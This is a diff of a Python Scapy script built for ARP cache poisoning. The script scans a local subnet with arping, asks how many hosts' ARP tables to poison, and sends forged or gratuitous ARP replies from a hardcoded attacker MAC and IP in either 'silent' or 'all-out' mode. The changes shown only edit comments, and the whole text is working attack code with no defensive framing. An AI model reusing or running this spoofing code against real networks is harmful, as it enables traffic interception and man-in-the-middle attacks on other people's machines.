@@ -13,7 +13,7 @@ def spoofedPkt(macVictim, ipVictim, ipToSpoof, interface):
     arp[ARP].hwdst = macVictim
     arp[ARP].pdst = ipVictim           
 
-    sendp(arp, loop = 0, iface=interface) # inter -> 60 sec to wait between 2 pkts
+    sendp(arp, loop = 0, iface=interface) # send one time the arp pkt 
 
 def gratutiousARP(macVictim, ipVictim, ipToSpoof, interface):
     #arp response that was not prompt by arp request
@@ -26,15 +26,15 @@ def gratutiousARP(macVictim, ipVictim, ipToSpoof, interface):
     arp[ARP].op = "is-at"
     print("MacVictim: ", macVictim)
     
-    sendp(arp, loop = 0, iface=interface) # inter -> 60 sec to wait between 2 pkts inter = 60, loop = 1,
+    sendp(arp, loop = 0, iface=interface) # send one time the arp pkt 
 
 interface = raw_input("Input interface, for example enp0s9: ")  
 
-hosts = arping("10.0.2.0/24") #checks which IPs in the range: 192.168.56.100-108 are up
+hosts = arping("10.0.2.0/24") #checks which IPs in the range: 10.0.2.0/24
 dictIPMAC = {}
 for i in range(len(hosts[0])): #hosts[0] contains the answers form the hosts that are up
     dictIPMAC[hosts[0][i][1][ARP].psrc] = hosts[0][i][1][ARP].hwsrc
-    print("Host ", hosts[0][i][1][ARP].psrc, "is up") #52:54:00:12:35:00
+    print("Host ", hosts[0][i][1][ARP].psrc, "is up") 
     
 print ( '\033[0m'  +"--------------------------------------------------------")
 print("How many hosts arp tables do you want to spoof: ")
@@ -52,9 +52,8 @@ for i in range(inputNumber):
 
 print("You want to poision the arp tables of ", ipVictims)
 
-# print("You want to poision the arp tables of ", ipVictims)
 mode = raw_input("Input silent for gratutions poisoning or all-out for request-reply: ")
-#shouldn't we make this automatic to make it work on multiple systems?
+
 macAttacker = "08:00:27:96:ae:0b"            
 ipAttacker = "10.0.2.5"
 
